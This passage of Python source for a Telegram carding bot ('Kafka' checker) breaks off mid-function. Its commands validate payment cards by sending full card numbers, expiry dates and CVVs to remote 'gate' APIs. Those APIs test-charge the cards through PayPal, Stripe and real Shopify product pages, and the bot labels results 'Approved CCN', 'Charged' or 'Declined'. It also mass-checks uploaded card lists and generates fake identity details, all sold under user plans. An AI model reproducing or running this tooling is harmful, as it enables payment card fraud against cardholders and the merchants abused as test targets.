        f"Time: ➜ {elapsed_seconds}\n"
        f"Req by ➜ @{username} [{user_info.get('plan', 'Free')}]\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )


async def fetch_api_data(api_url):
    """Your implementation of fetching data from the API goes here.  This is a placeholder."""
    # Example using aiohttp (you'll need to install it: pip install aiohttp)
    import aiohttp
    async with aiohttp.ClientSession() as session:
        async with session.get(api_url) as response:
            if response.status == 200:
                return await response.text()  #Or json() if API returns JSON
            else:
                return f"API request failed with status code: {response.status}"
  
#fake

@app.on_message(command_with_mention("fake"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ Usage: /fake us \nStatus: Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    code = message_text[1] 

    start_time = time.time()

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('🍳 Cooking Something Good....!🍷', parse_mode=enums.ParseMode.HTML)

    api_url = f"https://xronak.whf.bz/fake.php?code={code}"

    try:
        api_response = await fetch_api_data(api_url)

        if api_response is None:
            reply_message = "Error fetching data from the API."
        elif isinstance(api_response, str): #Handle string error messages
            reply_message = f"API error: {api_response}"
        elif api_response.get("status") == "success":
            data = api_response.get("data", {})
            # Improved data extraction with default values and error handling
            country = data.get("country", "N/A")
            state = data.get("state", "N/A")
            city = data.get("city", "N/A")
            zip_code = data.get("zip", "N/A")
            phone = data.get("phone", "N/A")
            cell = data.get("cell", "N/A")
            username = data.get("username", "N/A")
            gender = data.get("gender", "N/A")
            first_name = data.get("firstName", "N/A")
            last_name = data.get("lastName", "N/A")
            street = data.get("street", "N/A")
            dob = data.get("dob", "N/A")
            age = data.get("age", "N/A")
            email = data.get("email", "N/A")


            reply_message = (
                f"Fake Details [ /fake ]\n"
                f"API Response:\n"
                f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"Country: {country}\n"
                f"State: {state}\n"
                f"City: {city}\n"
                f"Zip: {zip_code}\n"
                f"Street: {street}\n"
                f"Phone: {phone}\n"
                f"Cell: {cell}\n"
                f"Email: {email}\n"
                f"Username: {username}\n"
                f"Gender: {gender}\n"
                f"First Name: {first_name}\n"
                f"Last Name: {last_name}\n"
                f"Date of Birth: {dob}\n"
                f"Age: {age}\n"
                f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                f"Time: {time.time() - start_time:.2f} seconds\n"
                f"Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
                f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
            )
        else:
            reply_message = f"API request failed: {api_response.get('message', 'Unknown error')}"

    except aiohttp.ClientError as e:
        reply_message = f"Network error: {e}"
    except Exception as e:
        reply_message = f"An error occurred: {e}"

    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return f"API request failed with status: {response.status}"
    except aiohttp.ClientError as e:
        return f"ClientError: {e}"
    except Exception as e:
        return f"An unexpected error occurred: {e}"            
          
                          
    
#--------------Gates Part--------------


from pyrogram import enums
import requests
import time

@app.on_message(command_with_mention("pp"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def check_card(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ **Usage:** /pp <cc> (e.g., /pp 5566250450925991|09|2028|812)', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    user_id = str(message.from_user.id)

    start_time = time.time()
    api_url = f"https://xronak.whf.bz/pp.php?lista={cc}"

    processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
        response = requests.get(api_url, headers=headers)
        response.raise_for_status()
        data = response.json()

        elapsed_time = time.time() - start_time
        elapsed_seconds = f"{elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"

        status = data.get("status", "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌")
        card = data.get("card", cc)
        response_msg = data.get("response", "N/A")
        bin_info = data.get("bin_info", "N/A")
        bank = data.get("bank", "N/A")
        country = data.get("country", "N/A")

        username = f"@{message.from_user.username} [{user_info.get('plan', 'Free')}]"
        reply_message = (
            f"<b>{status}</b>\n"
            f"・⌁▰▱▰▱⌁・\n\n"
            f"-» 𝐂𝐚𝐫𝐝 : <code>{cc}</code>\n"
            f"--» 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞  : <b>{response_msg}</b>\n"
            f"--» 𝐆𝐚𝐭𝐞𝐰𝐚𝐲  : <b>PayPal 0.01$</b>\n"
            f"- - - - - - - - - - - - - - -\n"
            f"• 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 : {bin_info}\n\n"
            f"• 𝐈𝐬𝐬𝐮𝐞𝐫 : {bank}\n\n"
            f"• 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 : {country}\n"
            f"——————————\n"
            f"● 𝗧𝗶𝗺𝗲 : <code>{elapsed_seconds}</code>\n"
            f"○ 𝗥𝗲𝗾 𝗯𝘆 : <b>{username}</b>\n"
            f"《《《⌁▰▱▰▱⌁》》》"
        )

        await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    except requests.RequestException as e:
        await processing_message.edit(f'⚠️ <b>Error checking card</b>', parse_mode=enums.ParseMode.HTML)



user_masspp_data = {}

@app.on_message(command_with_mention("masspp"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def masspp(client, message, user_info, *args, **kwargs):
    message_to_reply = message.reply_to_message
    if not message_to_reply or not message_to_reply.document:
        await message.reply('⚠️ **You need to reply to a file containing CCs.**')
        return

    user = message.from_user
    user_id = user.id
    plan = user_info.get('plan', 'Free')

    if message_to_reply.document.mime_type != 'text/plain':
        await message.reply('⚠️ **The file must be a .txt file.**')
        return

    file_path = await message_to_reply.download()

    with open(file_path, 'r') as f:
        ccs = [line.strip() for line in f.readlines()]

    if len(ccs) > 50:
        await message.reply('⚠️ **You can only check up to 50 CCs at a time.**')
        os.remove(file_path)
        return

    user_masspp_data[user_id] = {
        'hits': [],
        'declined': [],
        'left': len(ccs)
    }

    start_time = time.time()
    initial_message = await message.reply(
        f'**𝙆𝙖𝙛𝙠𝙖 𝙈𝙖𝙨𝙨 𝙋𝙖𝙮𝙋𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙧**\n'
        f'▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n'
        f'ᥫ>**Check by :** @{user.username} [{plan}]\n'
        f'ᥫ>**Time :** {datetime.now().strftime("%d-%m-%Y")}\n'
        f'ᥫ>**Ccs:** {len(ccs)}\n'
    )

    async def update_masspp_buttons():
        hits = len(user_masspp_data[user_id]['hits'])
        declined = len(user_masspp_data[user_id]['declined'])
        left = user_masspp_data[user_id]['left']

        buttons = [
            [InlineKeyboardButton(f"Hits: {hits}", callback_data="hits"), InlineKeyboardButton(f"Declined: {declined}", callback_data="declined")],
            [InlineKeyboardButton(f"Left: {left}", callback_data="left")]
        ]
        keyboard = InlineKeyboardMarkup(buttons)
        await initial_message.edit_reply_markup(reply_markup=keyboard)

    await update_masspp_buttons()

    for cc in ccs:
        api_url = f"http://xronak.site/pp.php?lista={cc}"
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
            response = requests.get(api_url, headers=headers)
            response.raise_for_status()
            data = response.json()

            status = data.get("status", "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌")
            card = data.get("card", cc)
            response_msg = data.get("response", "N/A")
            bin_info = data.get("bin_info", "N/A")
            bank = data.get("bank", "N/A")
            country = data.get("country", "N/A")

            if "approved" in status.lower():
                hit_message = (
                    f"亗 **𝙃𝙞𝙩 𝘼𝙧𝙧𝙞𝙫𝙚𝙙**\n"
                    f"▬▬▬▬▬▬▬▬\n"
                    f"#{status}\n"
                    f"-» **𝐂𝐚𝐫𝐝 :** `{card}`\n"
                    f"--» **𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞  :** {response_msg}\n"
                    f"--» **𝐆𝐚𝐭𝐞𝐰𝐚𝐲  :** **PayPal 0.01$**\n"
                    f"- - - - - - - - - - - - - - -\n"
                    f"• **𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 :** {bin_info}\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬"
                )
                await message.reply(hit_message)
                user_masspp_data[user_id]['hits'].append(hit_message)
            else:
                declined_data = {
                    'card': card,
                    'response': response_msg,
                    'bin_info': bin_info
                }
                user_masspp_data[user_id]['declined'].append(declined_data)

            user_masspp_data[user_id]['left'] -= 1
            await update_masspp_buttons()

        except requests.RequestException as e:
            logger.error(f"Error checking card: {e}")

        await asyncio.sleep(2)

    os.remove(file_path)

    elapsed_time = time.time() - start_time
    done_message = (
        f"**𝗗𝗼𝗻𝗲 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴**\n"
        f"⌁・▬▬▬▬▬\n"
        f"[ϟ] **Gate :** **PayPal 0.01$**\n\n"
        f"ㄥ**Checked by :** @{user.username}\n"
        f"ㄥ**Took :** `{elapsed_time:.2f} seconds`\n"
        f"ㄥ**Date :** {datetime.now().strftime('%d-%m-%Y')}\n\n"
        f"•━━━━━━\n"
        f"[+] **Hits :** {len(user_masspp_data[user_id]['hits'])}\n"
        f"[+] **Declined :** {len(user_masspp_data[user_id]['declined'])}"
    )
    await message.reply(done_message)
    del user_masspp_data[user_id]


@app.on_callback_query(filters.regex('hits'))
async def hits_callback(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in user_masspp_data:
        await callback_query.answer("No ongoing mass check found.", show_alert=True)
        return
    hits = '\n\n'.join(user_masspp_data[user_id].get('hits', []))
    await callback_query.message.reply(f"**Hits:**\n\n{hits}")

@app.on_callback_query(filters.regex('declined'))
async def declined_callback(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in user_masspp_data:
        await callback_query.answer("No ongoing mass check found.", show_alert=True)
        return
    declined_filename = f"declined_{time.strftime('%H_%M_%S')}.txt"
    with open(declined_filename, 'w') as file:
        for declined in user_masspp_data[user_id].get('declined', []):
            file.write(f"{declined.get('card', 'N/A')}|{declined.get('response', 'N/A')}|{declined.get('bin_info', 'N/A')}\n")
    await client.send_document(callback_query.message.chat.id, declined_filename)
    os.remove(declined_filename)

@app.on_callback_query(filters.regex('left'))
async def left_callback(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in user_masspp_data:
        await callback_query.answer("No ongoing mass check found.", show_alert=True)
        return
    left = user_masspp_data[user_id].get('left', 0)
    await callback_query.message.reply(f"**CCs Left:** `{left}`")


@app.on_message(command_with_mention("sh"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def check_shopify(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_shopify(client, message, user_info, *args, **kwargs))

async def process_shopify(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/sh cc|month|year|cvv</code>\n\n » 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : Shopify + PayPal ☔\n » Price: $5\n » Status : Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    user_id = str(message.from_user.id)
    plan = user_info.get('plan', 'Free')

    start_time = time.time()
    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://kasuttamu.com/products/punpun"
    
    processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                data = await response.json()
                
                elapsed_time = time.time() - start_time
                elapsed_seconds = f"{elapsed_time:.2f} seconds"
                
                status = data.get("response", "Declined 🔴")
                card = data.get("cc", cc)
                price = data.get("price", "N/A")
                response_msg = data.get("response", "N/A")
                took = data.get("took", "N/A")
                
                username = f"@{message.from_user.username} [{plan}]"
                
                if response_msg and any(key in response_msg for key in [
                    'Insufficient Funds',
                    'code was not matched by the processor',
                    'Card Issuer Declined CVV',
                    'Security codes does not match correct format (3-4 digits)'
                ]):
                    status = "Approved CCN ✅"
                
                elif response_msg and any(key in response_msg for key in [
                    'You’ll receive a confirmation email with your order number shortly.',
                    'Thank you for your purchase!',
                    'receive a confirmation email with your order number shortly.',
                    'order is confirmed',
                    f"Thank you {message.from_user.first_name}!",
                    'Your order is confirmed'
                ]):
                    status = "Charged 🔥"
                
                else:
                    status = "Declined ❌"

                reply_message = (
                    f"<b>{status}</b>\n"
                    f"・⌁▰▱▰▱⌁・\n\n"
                    f"-» <b>Card:</b> <code>{card}</code>\n"
                    f"--» <b>Response:</b> <b>{response_msg}</b>\n"
                    f"--» <b>Gateway:</b> <b>Shopify + PayPal</b>\n"
                    f"- - - - - - - - - - - - - - -\n"
                    f"• <b>Price:</b> <b>$5</b>\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                    f"• <b>Time:</b> <code>{elapsed_seconds}</code>\n"
                    f"○ <b>Req by:</b> <b>{username}</b>\n"
                    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                )
                
                await processing_message.edit_text(reply_message, parse_mode=enums.ParseMode.HTML)
        except aiohttp.ClientError as e:
            await processing_message.edit_text(f'⚠️ <b>Error try again</b>', parse_mode=enums.ParseMode.HTML)


@app.on_message(command_with_mention("so"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def check_so(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_so(client, message, user_info, *args, **kwargs))

async def process_so(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/so cc|month|year|cvv</code>\n\n » 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : Shopify + PayPal 🌥️\n » Price: $5\n » Status : Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    user_id = str(message.from_user.id)
    plan = user_info.get('plan', 'Free')

    start_time = time.time()
    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://shopcgx.com/./products/vf-4x6-usa-ctn-flagw-cup"
    
    processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                data = await response.json()
                
                elapsed_time = time.time() - start_time
                elapsed_seconds = f"{elapsed_time:.2f} seconds"
                
                status = data.get("response", "Declined 🔴")
                card = data.get("cc", cc)
                price = data.get("price", "N/A")
                response_msg = data.get("response", "N/A")
                took = data.get("took", "N/A")
                
                username = f"@{message.from_user.username} [{plan}]"
                
                if response_msg and any(key in response_msg for key in [
                    'Insufficient Funds',
                    'code was not matched by the processor',
                    'Card Issuer Declined CVV',
                    'Security codes does not match correct format (3-4 digits)'
                ]):
                    status = "Approved CCN ✅"
                
                elif response_msg and any(key in response_msg for key in [
                    'You’ll receive a confirmation email with your order number shortly.',
                    'Thank you for your purchase!',
                    'receive a confirmation email with your order number shortly.',
                    'order is confirmed',
                    f"Thank you {message.from_user.first_name}!",
                    'Your order is confirmed'
                ]):
                    status = "Charged 🔥"
                
                else:
                    status = "Declined ❌"

                reply_message = (
                    f"<b>{status}</b>\n"
                    f"・⌁▰▱▰▱⌁・\n\n"
                    f"-» <b>Card:</b> <code>{card}</code>\n"
                    f"--» <b>Response:</b> <b>{response_msg}</b>\n"
                    f"--» <b>Gateway:</b> <b>Shopify + PayPal</b>\n"
                    f"- - - - - - - - - - - - - - -\n"
                    f"• <b>Price:</b> <b>$5</b>\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                    f"• <b>Time:</b> <code>{elapsed_seconds}</code>\n"
                    f"○ <b>Req by:</b> <b>{username}</b>\n"
                    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                )
                
                await processing_message.edit_text(reply_message, parse_mode=enums.ParseMode.HTML)
        except aiohttp.ClientError as e:
            await processing_message.edit_text(f'⚠️ <b>Error try again</b>', parse_mode=enums.ParseMode.HTML)


@app.on_message(command_with_mention("su"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def check_su(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_su(client, message, user_info, *args, **kwargs))

async def process_su(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/su cc|month|year|cvv</code>\n\n » 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : Shopify + PayPal ⛈️\n » Price : $21\n » Status : Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    user_id = str(message.from_user.id)
    plan = user_info.get('plan', 'Free')

    start_time = time.time()
    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://www.garnetandgold.com/products/small-garnet-round-beads"
    
    processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                data = await response.json()
                
                elapsed_time = time.time() - start_time
                elapsed_seconds = f"{elapsed_time:.2f} seconds"
                
                status = data.get("response", "Declined 🔴")
                card = data.get("cc", cc)
                price = data.get("price", "N/A")
                response_msg = data.get("response", "N/A")
                took = data.get("took", "N/A")
                
                username = f"@{message.from_user.username} [{plan}]"
                
                if response_msg and any(key in response_msg for key in [
                    'Insufficient Funds',
                    'code was not matched by the processor',
                    'Card Issuer Declined CVV',
                    'Security codes does not match correct format (3-4 digits)'
                ]):
                    status = "Approved CCN ✅"
                
                elif response_msg and any(key in response_msg for key in [
                    'You’ll receive a confirmation email with your order number shortly.',
                    'Thank you for your purchase!',
                    'receive a confirmation email with your order number shortly.',
                    'order is confirmed',
                    f"Thank you {message.from_user.first_name}!",
                    'Your order is confirmed'
                ]):
                    status = "Charged 🔥"
                
                else:
                    status = "Declined ❌"

                reply_message = (
                    f"<b>{status}</b>\n"
                    f"・⌁▰▱▰▱⌁・\n\n"
                    f"-» <b>Card:</b> <code>{card}</code>\n"
                    f"--» <b>Response:</b> <b>{response_msg}</b>\n"
                    f"--» <b>Gateway:</b> <b>Shopify + PayPal</b>\n"
                    f"- - - - - - - - - - - - - - -\n"
                    f"• <b>Price:</b> <b>$21</b>\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                    f"• <b>Time:</b> <code>{elapsed_seconds}</code>\n"
                    f"○ <b>Req by:</b> <b>{username}</b>\n"
                    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                )
                
                await processing_message.edit_text(reply_message, parse_mode=enums.ParseMode.HTML)
        except aiohttp.ClientError as e:
            await processing_message.edit_text(f'⚠️ <b>Error try again</b>', parse_mode=enums.ParseMode.HTML)


@app.on_message(command_with_mention("li"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def check_li(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_li(client, message, user_info, *args, **kwargs))

async def process_li(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/li cc|month|year|cvv</code>\n\n » 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : Shopify + PayPal ⛅\n » Price : $29\n » Status : Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    user_id = str(message.from_user.id)
    plan = user_info.get('plan', 'Free')

    start_time = time.time()
    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://umbranoctis.com//products/seraphs-embrace"
    
    processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                data = await response.json()
                
                elapsed_time = time.time() - start_time
                elapsed_seconds = f"{elapsed_time:.2f} seconds"
                
                status = data.get("response", "Declined 🔴")
                card = data.get("cc", cc)
                price = data.get("price", "N/A")
                response_msg = data.get("response", "N/A")
                took = data.get("took", "N/A")
                
                username = f"@{message.from_user.username} [{plan}]"
                
                if response_msg and any(key in response_msg for key in [
                    'Insufficient Funds',
                    'code was not matched by the processor',
                    'Card Issuer Declined CVV',
                    'Security codes does not match correct format (3-4 digits)'
                ]):
                    status = "Approved CCN ✅"
                
                elif response_msg and any(key in response_msg for key in [
                    'You’ll receive a confirmation email with your order number shortly.',
                    'Thank you for your purchase!',
                    'receive a confirmation email with your order number shortly.',
                    'order is confirmed',
                    f"Thank you {message.from_user.first_name}!",
                    'Your order is confirmed'
                ]):
                    status = "Charged 🔥"
                
                else:
                    status = "Declined ❌"

                reply_message = (
                    f"<b>{status}</b>\n"
                    f"・⌁▰▱▰▱⌁・\n\n"
                    f"-» <b>Card:</b> <code>{card}</code>\n"
                    f"--» <b>Response:</b> <b>{response_msg}</b>\n"
                    f"--» <b>Gateway:</b> <b>Shopify + PayPal</b>\n"
                    f"- - - - - - - - - - - - - - -\n"
                    f"• <b>Price:</b> <b>$29</b>\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                    f"• <b>Time:</b> <code>{elapsed_seconds}</code>\n"
                    f"○ <b>Req by:</b> <b>{username}</b>\n"
                    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                )
                
                await processing_message.edit_text(reply_message, parse_mode=enums.ParseMode.HTML)
        except aiohttp.ClientError as e:
            await processing_message.edit_text(f'⚠️ <b>Error try again</b>', parse_mode=enums.ParseMode.HTML)


@app.on_message(command_with_mention("chk"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply(
            '⚠️ Usage: /chk cc|month|year|cvv\n┬╗ Gateway: Stripe Auth 🪽\n┬╗ Status: Active ✅',
            parse_mode=enums.ParseMode.HTML
        )
        return

    cc = message_text[1]
    start_time = time.time()

    # Получаем BIN данные
    bin_data = await fetch_bin_data(cc[:6])

    # Подготавливаем значения по умолчанию
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API URL
    api_url = f"https://auth-1-3llv.onrender.com/auth?cc={cc}"
    vbv_url = f"http://xronak.site/vbv.php?lista={cc}"

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('🍳 Cooking Something Good....!🍷', parse_mode=enums.ParseMode.HTML)

    # Получаем ответы от API
    api_message, vbv_response = await asyncio.gather(
        fetch_api_message(api_url),
        fetch_api_data(vbv_url)
    )

    # Ключевые слова для APPROVED
    approved_keywords = [
        'transaction_not_allowed',
        'Payment method successfully added.',
        'Security code is incorrect.',
        'security code is invalid.',
        'Security code is invalid.',
        'incorrect_cvc',
        'Your card has insufficient funds.',
        'CHARGE 1$ 🔥',
        'Thank you for your donation',
        'Thank you for your support!',
        'Thank You For Donation.',
        'Thank You',
        'CHARGE 1$ 🌥️',
        'Your card does not support this type of purchase.'
    ]

    if api_message in approved_keywords:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    else:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"

    reply_message = (
        f"Stripe Auth [ /chk ]\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
        f"カ Card:</b> <code>{cc}</code>\n"
        f"Message ➜ {api_message}\n"
        f"VBV  ➜ {vbv_response}\n"
        f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"⁠✿ Type: ➜ {card_type}\n"
        f"⁠✿ Level: ➜ {brand}\n"
        f"⁠✿ Bank: ➜ {bank_name}\n"
        f"⁠✿ Country: ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"◉ Time: ➜ {elapsed_seconds}\n"
        f"◉ Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
        f"◉ Bot ➜ @kafkachecker_bot\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()
    
async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None

async def fetch_api_message(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("message", "No message in response")
                else:
                    return "API error"
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"    


#------------------Mass Auth--------------------


user_massau_data = {}

async def process_cc(api_url, cc, hits_file, declined_file, user_id, initial_message):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                data = await response.json()
                message_response = data.get("message", "Your card was declined")
                card = data.get("cc", cc)
                bank = data.get("bank", "UNKNOWN")
                country = data.get("country", "UNKNOWN")
                bin_info = data.get("bin_info", "UNKNOWN")

                if message_response in ['Succeeded', 'Insufficient funds in card', 'transaction_not_allowed', 'Payment method successfully added.', 'Security code is incorrect.', 'security code is invalid.', 'Security code is invalid.', 'incorrect_cvc', 'Your card has insufficient funds.', 'CHARGE 1$ 🔥', 'Thank you for your donation', 'Thank you for your support!', 'Thank You For Donation.', 'Thank You', 'CHARGE 1$ 🌥️', 'Your card does not support this type of purchase.']:
                    hits_file.write(
                        f"Card: {card}\n"
                        f"Message: {message_response}\n"
                        f"Bank: {bank}\n"
                        f"Country: {country}\n"
                        f"Bin Info: {bin_info}\n"
                        f"------\n"
                    )
                    user_massau_data[user_id]['hits'].append(cc)
                else:
                    declined_file.write(cc + '\n')
                    user_massau_data[user_id]['declined'].append(cc)

                user_massau_data[user_id]['left'] -= 1
                await update_massau_buttons(user_id, initial_message)

    except Exception as e:
        logger.error(f"Error checking card: {e}")

async def update_massau_buttons(user_id, initial_message):
    hits = len(user_massau_data[user_id]['hits'])
    declined = len(user_massau_data[user_id]['declined'])
    left = user_massau_data[user_id]['left']

    if (hits != user_massau_data[user_id].get('last_hits', 0) or 
        declined != user_massau_data[user_id].get('last_declined', 0) or 
        left != user_massau_data[user_id].get('last_left', 0)):
        buttons = [
            [InlineKeyboardButton(f"Hits: {hits}", callback_data="massau_hits"), InlineKeyboardButton(f"Declined: {declined}", callback_data="massau_declined")],
            [InlineKeyboardButton(f"Left: {left}", callback_data="massau_left"), InlineKeyboardButton("Stop", callback_data="massau_stop")]
        ]
        keyboard = InlineKeyboardMarkup(buttons)
        await initial_message.edit_reply_markup(reply_markup=keyboard)

        user_massau_data[user_id]['last_hits'] = hits
        user_massau_data[user_id]['last_declined'] = declined
        user_massau_data[user_id]['last_left'] = left

@app.on_message(filters.command("massau"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_auth_stripe(client, message, user_info, *args, **kwargs):
    message_to_reply = message.reply_to_message
    if not message_to_reply or not message_to_reply.document:
        await message.reply('⚠️ **You need to reply to a file containing CCs.**')
        return

    user = message.from_user
    user_id = user.id
    username = user.username
    day = datetime.now().strftime('%d-%m-%Y')

    if message_to_reply.document.mime_type != 'text/plain':
        await message.reply('⚠️ **The file must be a .txt file.**')
        return

    file_path = await message_to_reply.download()

    with open(file_path, 'r') as f:
        ccs = [line.strip() for line in f.readlines()]

    plan = get_user_info(user_id).get('plan', 'Free')
    if plan == 'Free' and len(ccs) > 100:
        await message.reply('⚠️ **Free users can only check up to 100 CCs at a time.**')
        os.remove(file_path)
        return
    elif plan == 'Plus' and len(ccs) > 200:
        await message.reply('⚠️ **Plus users can only check up to 200 CCs at a time.**')
        os.remove(file_path)
        return

    user_massau_data[user_id] = {
        'hits': [],
